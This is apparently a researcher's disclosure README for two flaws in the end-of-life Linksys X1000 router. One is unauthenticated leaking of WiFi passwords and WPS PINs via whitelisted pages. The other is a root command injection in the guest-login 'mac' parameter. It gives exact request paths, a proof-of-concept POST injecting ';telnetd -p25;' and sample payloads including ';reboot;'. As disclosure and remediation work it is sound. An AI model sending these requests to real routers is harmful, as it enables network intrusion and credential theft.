# Linksys-public-reference
This repository contains details of the vulnerabilities that I've found on a EOL router which is Linksys X1000. In order to assign CVEs with VulnCheck

# Unauthenticated WiFi Credential & Device-Info Disclosure

- **Target:** Linksys X1000, firmware `FW_X1000_ANNEX_A_1.0.01.005` (Jan 2015)
- **Component:** `/bin/httpd` (Broadcom CMS / Ayecom web server), MIPS32 BE
- **Severity:** High (CWE-306, Missing Authentication for Critical Function)
- **Status:** Static analysis confirmed; dynamic confirmation pending
- **VulnCheck Submission ID:** a4783af0-716d-4062-a09a-e4ed502331e2

### Summary
A plain unauthenticated GET to a whitelisted page returns live wireless credentials
and device identifiers rendered server-side:

```
GET /sH0w$mE$m0Re.html HTTP/1.1
GET /show_me_more.html HTTP/1.1
```

No HTTP Basic credentials, session key, or cookie are required.

### Exposed data (server-side `<%ejGetWl(...)%>` / `<%ejGet(...)%>` substitution)
- `wlWpaPsk` — WPA/WPA2 pre-shared key (2.4G and `ejGetWl1` secondary radio)
- `wlKey0`..`wlKey3`, `wlKeyIndex` — WEP keys
- `default_psk` — factory default PSK
- `wlWscDevPin` — WPS device PIN
- `wlSsid_wl0v0`, `wlBssid` — SSIDs / BSSIDs
- `sysInfo:serialNo` — serial number
- `lanMac`, `wanStatusInfo:ethwanmac`, `:dslwanmac` — LAN/WAN MAC addresses
- `sysVersion`, `hdwarVersion`, `boardID`, `cfeVersion` — firmware/hardware/CFE versions

Template source: `webs/sH0w$mE$m0Re.html`, `webs/show_me_more.html` (lines 11-20, 80-92, 123-225, 276).

### Why it is unauthenticated (root cause in `handle_request`, `sub_40e388`)
Authentication is decided by a per-MIME-handler flag, then overridden by a hardcoded
page whitelist that branches **past** the Basic-auth gate:

- Default `needsAuth` byte `data_4f65b0` = 0 (cleared at `0x40ff64`).
- For `.html`/`.cgi`/`.cmd` the matched `mime_handlers` entry has `+0xc != 0`, so
  `needsAuth` is set to 1 at `0x4106e0` and the gate at `0x410d58` challenges for
  `Basic` creds (`cmsDal_authenticate`).
- BUT before the gate, a strcmp/strstr whitelist is checked. Matching entries jump to
  `0x411160` — the same dispatch used after a *successful* login — bypassing the gate:
  - `0x410a74` `cmsUtl_strcmp(name, "show_me_more.html")  == 0 -> 0x411160`
  - `0x410a90` `cmsUtl_strcmp(name, "sH0w$mE$m0Re.html")  == 0 -> 0x411160`
- The page is then rendered with `do_ej`, which performs the `ejGetWl`/`ejGet`
  substitutions (reading wl/NVRAM config) with no auth of its own.

Full unauth whitelist also includes: `GUIWlShowUnsecurePage.cgi`,
`GUIWlcheckmobilePage.cgi`, `Unsecured.html`, `UnsecuredEnable.html`,
`Guestnetwork.html`, `Guest_mobile.html`, `Guest_Login.html`, `tmBlock.html`,
`tmBlock_mobile.html`, `Sys_log.html`, `status_tr69.html`, `image/layout/`,
`image/buttons/`, `console.log`, and static assets (`.js .css .gif .ico .pcap`).

### Exposure
- **LAN:** always reachable.
- **WAN:** reachable when remote management is enabled (same model as CVE-2022-35572).

### Impact
Full recovery of WiFi WPA/WPA2 PSK and WPS PIN by any unauthenticated client →
network join, traffic decryption, and (with WPS PIN) persistent access. Serial
number + MACs + firmware version aid device fingerprinting and follow-on attacks.

### Remediation
Remove `sH0w$mE$m0Re.html` / `show_me_more.html` from the pre-auth whitelist, or
require a valid session before `ejGetWl` renders secret values.

---

# Command Injection in Guest-Access Unblock (`mac` parameter)

- **Target:** Linksys X1000, firmware `FW_X1000_ANNEX_A_1.0.01.005`
- **Component:** `/bin/httpd`, `do_cgi` (`sub_41a6e4`), `guest_login` handler
- **Severity:** High — OS command execution as root (CWE-78)
- **Privilege required:** Guest-network password only (NOT admin). Not remote-admin gated.
- **VulnCheck Submission ID:** 0987f32b-aca8-489c-97bd-b31ef54c5193

### Sink
`do_cgi` dispatches on `submit_type`. For `submit_type=guest_login` (`0x41e40c`+):

```
cgiGetValueByNameSafe(req, "guest_login", ..., var_2030, 0x28)   ; guest password
cgiGetValueByNameSafe(req, "mac",         ..., var_5454, 0x20)   ; attacker-controlled, URL-decoded, UNSANITIZED
...
if (cmsDal_CheckGuestPassword(var_2030)) {                        ; 0x41e484 — guest pw gate
    sprintf(var_1030, "echo 'add %s' > /proc/uf_guest_unblock", var_5454); ; 0x41e514
    system(var_1030);                                             ; 0x41e530  -> ROOT shell
}
```

`cgiGetValueByNameSafe` only length-bounds (to 0x20) and URL-decodes; it does **no**
shell-metacharacter filtering. `mac` is not passed through `TcmValidateMACaddress`
before the `sprintf`. So shell metacharacters in `mac` execute as root.

### Reachability
- Handler lives in the `.cgi` MIME handler `do_cgi` (`sub_41a6e4`).
- Reached via the **unauthenticated** guest CGI `GUIWlcheckmobilePage.cgi`
  (in the pre-auth whitelist in `handle_request`; see F1). The page name clears the
  Basic-auth gate; `do_cgi` then dispatches purely on `submit_type`.
- Gate: `cmsDal_CheckGuestPassword(guest_login)` must succeed.

### Gate analysis - likely UNAUTHENTICATED by default
`cmsDal_CheckGuestPassword` (`libcms_dal.so` @ 0x1baa4) is a plain strcmp:

```c
cmsObj_get(0xe, ..., &obj, ...);            // guest-access config object
return (cmsUtl_strcmp(*(obj+0x2c), arg1) == 0) ? 1 : 0;   // stored pw vs submitted
```

- The `do_cgi` `guest_login` branch runs this strcmp **without first checking
  `GuestEnable`** — so the gate is only the password comparison.
- Shipped `etc/default.cfg`: guest access is disabled (`X_BROADCOM_COM_GuestEnable=FALSE`)
  AND the `guest` UserCfg (GroupCfg instance 2) ships with **no `<Password>` element**
  (contrast: admin UserCfg ships `<Password>8888888</Password>`). So the stored
  guest-access password defaults to **empty**.
- Therefore `cmsDal_CheckGuestPassword("")` -> `strcmp("", "") == 0` -> **pass**, i.e.
  sending `guest_login=` (empty) satisfies the gate on a default device -> the command
  injection is **unauthenticated**.

### NULL-safety resolved
`cmsUtl_strcmp` (`libcms_util.so` @ 0x21fc0) replaces a NULL arg with a pointer to an
empty string before calling `strcmp`:
```c
if (!arg1) arg1 = "";   if (!arg2) arg2 = "";   return strcmp(arg1, arg2);
```
So `cmsUtl_strcmp(stored, "")` returns 0 (match) whether `stored` is NULL or "".
=> an empty `guest_login=` passes the gate on a default (unset) guest password.

### Confidence
Unauthenticated-by-default: HIGH (strcmp gate + empty default + NULL-safe compare all
confirmed). Pending only the OID `0xe` default-value confirmation.

### Constraint
`mac` buffer is 0x20 (max 31 chars + NUL). Enough for a short payload, e.g.
`;telnetd -p25;` or `;reboot;`. URL-encode metacharacters (`%3b` = `;`).

### PoC shape (to validate on device/emulator)
```
POST /GUIWlcheckmobilePage.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

submit_type=guest_login&guest_login=<GUEST_PW>&mac=;telnetd%20-p25;
```
Expected: `sh -c "echo 'add ;telnetd -p25;' > /proc/uf_guest_unblock"` runs as root.

### Remediation
Validate `mac` against a strict MAC regex (or pass `TcmValidateMACaddress`) before use;
avoid `system()` — write the sanitized value to `/proc/uf_guest_unblock` directly.
